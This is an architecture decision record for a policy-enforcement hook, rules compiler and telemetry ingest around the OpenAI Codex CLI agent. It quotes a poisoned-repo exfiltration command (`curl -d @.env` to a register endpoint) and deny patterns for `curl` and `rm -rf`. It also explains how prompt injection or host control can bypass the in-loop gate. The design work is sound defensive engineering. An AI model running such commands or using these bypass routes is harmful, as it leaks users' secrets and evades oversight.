# ADR 0022: OpenAI Codex CLI Integration (Agent-Loop Gate)

- **Status:** Accepted
- **Date:** 2026-06-12

## Context

The existing 15 integrations are observation-style adapters: they ask
`POST /v1/inspect` for a verdict and cooperate with the host framework to
honor it, failing open on transport errors. OpenAI Codex CLI exposes three
native surfaces no other supported framework has, which make a deeper,
bidirectional integration possible:

1. **A synchronous hook engine.** Codex invokes a shell command on each loop
   event, passes a JSON payload on stdin and reads the response; from a
   PreToolUse hook, exit code 2 blocks the pending tool call. This is an
   enforcement point *inside* the agent's loop, without eBPF.
2. **A native rules engine (execpolicy).** Starlark `.rules` files with
   `prefix_rule(pattern, decision, justification, ...)` and strictest-wins
   semantics (`forbidden` > `prompt` > `allow`) — the same merge semantics as
   the Dictum overlay, and a natural static compile target for Dictum bundles.
3. **Structured session telemetry.** Newline-delimited JSON events from
   `codex exec --json` (and persisted rollout files), ingestible as evidence.

Codex also supports organization-managed configuration (`requirements.toml`,
MDM): managed hooks are trusted by policy and cannot be disabled by the user's
own config, which is how an organization makes the gate non-optional.

## Decision

### One plug-in crate, zero core coupling

All Codex-specific code lives in `crates/iaga-sentinel-codex`, behind a single
binary `iaga-codex` (one artifact to checksum and hash-pin in Codex's hook
trust). The core `iaga` binary gains no Codex knowledge, no subcommand, no
dependency: Codex is a hyper-specific plug-in, not a core concern. The crate
depends only on `iaga-sentinel-integrations` (the public wire contract); it
never touches the pipeline, receipt schema, or crypto.

Planned subcommands, shipped incrementally:

- `iaga-codex hook` — the gate (minimal scope: PreToolUse only).
- `iaga-codex export-rules` — Dictum bundle → execpolicy `.rules` compiler
  (static defense-in-depth layer; consumes the public Dictum AST). Shipped.
- `iaga-codex ingest` — `codex exec --json` session telemetry → inspect
  calls, explicitly typed as live-ingest or post-hoc attestation in request
  metadata. Shipped.

### The compiler (`export-rules`)

`iaga-codex export-rules --dictum <bundle> --out <file>` compiles a Dictum bundle
to a native execpolicy `.rules` file. It depends on `iaga-sentinel-dictum`'s
public front-end only (`compile()` + the AST), never the evaluator internals
or the core pipeline.

The bar is **faithfulness, not coverage**: a static `prefix_rule` is emitted
only when the Dictum policy fires *exactly* when a shell command starts with a
literal prefix — `starts_with(<command-path>, "literal")`, optionally ANDed
with the `action.kind == "shell"` gate. A "command path" is one whose last
segment is `command`, `cmd`, or `argv` (the Dictum context exposes the command
under `action.payload.*`, see `pipeline/dictum_overlay.rs`). Verdicts map
`block → forbidden`, `review → prompt`, `allow → allow`. Anything with a
runtime condition (risk score, `contains`, membership, `secret_ref`,
ML/usage paths, disjunction, catch-all `when true`, multiple prefixes) is
reported **runtime-only** and left to the gate — emitting a looser-or-tighter
static rule would silently change policy semantics, which we refuse to do.
Each file carries the SHA-256 of the source bundle so static↔runtime drift
is detectable.

**execpolicy contract (validated against the pinned Codex version).** The
syntax is confirmed against `codex execpolicy check` on the version pinned in
`plug-ins/codex-plugin/README.md`, and is isolated in one module
(`src/execpolicy_format.rs`):

- `pattern` is an argv prefix; each position is a `str` or a non-empty
  `list[str]` of alternatives. `["curl"]` matches `curl` with any trailing
  args; `["rm", "-rf"]` matches `rm -rf ...`. An **empty inner list**
  (`["curl", []]`) is **invalid** — it is NOT a wildcard. The compiler emits
  only literal positions (plain strings).
- `decision` ∈ {`allow`, `prompt`, `forbidden`} (`deny` is rejected).
- `justification` is optional but must be non-empty when present; we always
  emit it, carrying the originating Dictum policy name + reason.
- `match` / `not_match` are optional **parse-time assertions** (shell-string
  or argv-list examples); a self-consistent file is itself a round-trip
  test. The generated examples are constructed to always hold.
- `codex execpolicy check --rules <f> -- <argv>` prints JSON (compact, or
  `--pretty`); exit 0 for any decision or no match, exit 1 for usage/parse
  errors. A CI round-trip job (gated on the Codex binary, mirroring the
  postgres/E2E jobs) is the next step; an `#[ignore]`d test already shells
  out to it.

### The gate (minimal scope)

`iaga-codex hook` reads one event from stdin, maps it onto the public
`InspectRequest`, asks for a verdict and exits:

- `allow` → exit 0; `block` → exit 2 with the policy justification (joined
  `risk.reasons`) on stdout; `review` → exit 2, conservative block, until the
  spike confirms whether Codex hooks support an "ask the user" response.
- **Fail-closed by default** — deliberately the opposite of the
  observation-style adapters. This integration is an enforcement point: an
  unreachable sidecar must not silently widen what the agent may do.
  `IAGA_CODEX_FAIL=open` opts into availability; the gap is declared on
  stderr and produces no receipt.
- Hard inspect timeout (default 1000 ms): the hook runs synchronously inside
  Codex's loop.
- The agent identity is **static** (`codex`, registered via
  `codex.policy.yaml`) because `/v1/inspect` returns 404 for unregistered
  agents; Codex session identity (`session_id`, `turn_id`, `cwd`,
  `permission_mode`) rides in request `metadata`, mirroring the claude-code
  hook.
- The tool payload is attacker-influenced (the model composes commands from
  repository content): the gate never interprets, interpolates, or logs it —
  it crosses as opaque JSON and is examined sidecar-side.

### The ingest (`ingest`)

`iaga-codex ingest` consumes a `codex exec --json` stream (newline-delimited
JSON) and mints one receipt per **completed, payload-bearing item**
(`command_execution`, `file_change`, `mcp_tool_call`, `web_search`);
`item.started`/`item.updated` and narrative items (`reasoning`,
`agent_message`, …) mint nothing, so evidence is not duplicated. It is the
**advisory** end of the tier ladder: the verdict is *recorded, never
applied* — the action the stream narrates has already run — declared as
`metadata.enforcement = "advisory"`. There is therefore no fail policy and
nothing to block; per-item failures are counted and the stream keeps flowing
(an evidence plane records as much as it can), the one hard stop being an
unregistered-agent 404, which would fail every later call identically.

Three input modes, one parser, no new dependency and no core coupling — even
spawning Codex happens inside the plug-in binary:

- **stdin** (`codex exec --json … | iaga-codex ingest`) → `live-ingest`.
- **`--from <file>`** re-processes a captured stream → `post-hoc` (a
  deterministic, offline demo path).
- **`-- <command…>`** spawns the command and attests its stdout (an absolute
  path works, so Codex need not be on `PATH`) → `live-ingest`.

Exit codes follow the workspace convention with precedence 3 > 2 > 1: `0`
fully attested, `1` a spawned command exited non-zero, `2` an attestation gap
(≥1 actionable item without a receipt, including the 404 abort), `3`
I/O/usage (unreadable `--from`, failed spawn, or `--from` and `--` together).
The **rollout-file** parser (`~/.codex/sessions/**/rollout-*.jsonl`) is out
of scope: the format is unstable across Codex minors and the live stream is
preferred.

### Provisional contracts, isolated by construction

All Codex field-name knowledge is confined to two modules — the hook payload
to `src/codex_event.rs`, the exec stream to `src/exec_stream.rs` — and to the
fixtures; correcting a contract touches that one module and its fixtures,
nothing else. The pinned Codex version is recorded only in
`plug-ins/codex-plugin/README.md`.

**Spike results (codex-cli 0.138.0-alpha.7).**

- *Exec stream — CONFIRMED.* A real `codex exec --json` capture
  (`tests/fixtures/exec_stream_real_0.138.jsonl`) validates the stream
  contract; `exec_stream.rs` parses it unchanged (`command_execution` carries
  a string `command` plus `aggregated_output`/`exit_code`/`status`;
  `file_change` carries `changes:[{path,kind}]`). `mcp_tool_call` and
  `web_search` shapes remain uncaptured.
- *Hook payload — field names CONFIRMED, literal capture pending.* Codex's
  hook engine is Claude-Code-compatible (it migrates hooks from `.claude`).
  The discriminator is **`hook_event_name`** (the design-time `event` was
  wrong); `codex_event.rs` is reconciled to the real names with an `event`
  alias. `codex exec` did not fire hooks during the spike (hooks load only for
  a trusted directory and fire in the interactive TUI), so a literal payload
  echo is still pending. Hooks are registered via a Claude-Code `hooks.json`
  (confirmed against an installed plugin), not the design-time
  `[[hooks.pre_tool_use]]`; `config.toml.example` and `hooks.json` are
  corrected.
- *Approval / "ask".* Codex supports `hookSpecificOutput.permissionDecision =
  allow | deny | ask`. So a `review` verdict can map to a real human-in-the-
  loop **ask** rather than today's conservative block. Deferred (not yet
  implemented); the gate keeps mapping `review → block` until the ask flow is
  built.

### Enforcement tier honesty

This integration introduces a tier between advisory and kernel:

- `advisory` — verdict recorded, action not interceptable (post-hoc ingest).
- `agent-loop` — verdict applied inside the agent's loop via hook (this
  integration). Stronger than advisory: a `block` prevents the action.
  Weaker than kernel: bypassable by whoever controls the host (hook
  disabling, bypass flags, shells outside Codex), unless hooks are
  org-managed.
- `kernel` — reserved for authoritative eBPF/LSM enforcement (Enterprise
  roadmap; never emitted by the open build).

The gate declares its tier as `metadata.enforcement = "agent-loop"` on every
inspect request, so the tier is part of the (input-hashed, audited) evidence
today **without touching the receipt schema**. `is_authoritative` stays
`false` in every open-build receipt: the limit is written inside the
evidence, consistent with the project's posture. A signed receipt field is
deliberately deferred: the OSS roadmap already schedules an
`enforcement_evidence` field for the ReceiptV2 schema at the 2.0 major bump,
and a competing 1.x field would duplicate it; if it is pulled forward, that
is its own ADR with the usual additive `Option` + byte-equality treatment.

### OS-sandbox egress enforcement (Phase 2 spike, 2026-06-13)

The `agent-loop` gate blocks cooperatively; an attacker controlling the model
(prompt injection) or the host can route around it. For the demo's egress
threat model, Codex's **native sandbox** closes that gap with **no Sentinel
code change**. `codex sandbox` runs a command under a **Windows restricted
token** that **denies outbound network by default** (modes
`read-only | workspace-write | danger-full-access`; only `danger-full-access`
opens the network). Live-verified on codex-cli 0.138.0-alpha.7: outside the
sandbox `curl http://example.com` returns 200; under `codex sandbox -- curl …`
the connection is refused **via `127.0.0.1`, before DNS resolution** (the
sandbox forces traffic through a proxy with no listener in default-deny), so
the egress — including the poisoned-repo `curl -d @.env http://…/register` —
cannot leave the machine even if every cooperative check were removed.

This is enforcement by **Codex's sandbox, not Sentinel**: Sentinel attests the
attempt and signs the verdict, and `is_authoritative` **stays `false`** — the
project never claims to own a wire it does not own. The runbook lives in
`plug-ins/codex-plugin/poisoned-repo/DEMO.md` (Phase 2 section); nothing
in the crate, core, or receipt schema changed. An operator-asserted
`metadata.enforcementLayer` label was considered and **declined** for now: the
gate cannot verify the sandbox state from a hook event, so it would be a
self-declaration about the environment — deferrable telemetry, not demo
evidence.

**Deferred.** *Option 3 — non-disableable managed hook*
(`requirements.toml` / `windows_managed_dir`): its load-bearing proof is a
negative test in the interactive TUI (`codex exec` does not fire hooks), and
managed-config behavior on this 0.138 alpha is unverified; the "cannot be
disabled by the user" claim will not ship until a live negative test
demonstrates it (honest fallback otherwise: "centrally deployed / harder to
disable"). Live attempt 2026-06-13: `hooks` is a stable feature and the event
set is confirmed, but setting `[hooks] windows_managed_dir` in the **user**
`$CODEX_HOME/config.toml` parsed OK while `/hooks` still reported **0 installed**
for every event — the managed-hooks dir is not honored from the user config
layer. The real non-disableable path is an admin/MDM-delivered
`requirements.toml` (`allow_managed_hooks_only`, plus `allowed_sandbox_modes`
to also lock the OS sandbox), which cannot be exercised on a single dev box, so
Option 3 stays documented and deferred with Option 1 as the shipped Phase 2
deliverable. *Option 2 — a Sentinel egress proxy* (sandbox network allowed only
via `proxy_url` → a Sentinel proxy enforcing the `allowed_domains` allowlist
and minting a receipt per connection) is feasible with zero core changes by
reusing `/v1/inspect`; it is the path to honestly attesting a
*Sentinel*-enforced network block, and is left as a dedicated next step.

### Out of scope (and why)

- **Session-chain receipts** (open/seal receipts, one chain per Codex
  session): today `run_id = event_id` (M2 semantics); grouping multi-step
  runs by trace identity is core M3 work, not an integration concern.
- **PostToolUse / SessionStart / Stop handling**: depends on the spike
  payloads and on the PermissionRequest-vs-PreToolUse dedup question.
- **CI jobs requiring the Codex binary** (execpolicy round-trip checks):
  follow once `export-rules` lands, patterned on the opt-in postgres/E2E
  jobs.

## Consequences

Sentinel gains its first in-the-loop enforcement integration: verdicts stop
actions before they happen, inside the agent, with the receipt trail intact
and the enforcement posture honestly declared. The gate is fully testable
without Codex (fixture-driven mapping, in-process mock sidecar), so CI needs
no new dependencies.

The provisional payload contract is a known, fenced risk: until the spike,
fixtures are synthetic and field names may be wrong — but wrong in exactly
one module. The fail-closed default makes misconfiguration loud (an
unregistered agent blocks everything with an actionable message) rather than
silently ungoverned.

A future `enforcement` receipt field, if pulled forward from ReceiptV2, will
already have its value flowing through request metadata from day one.
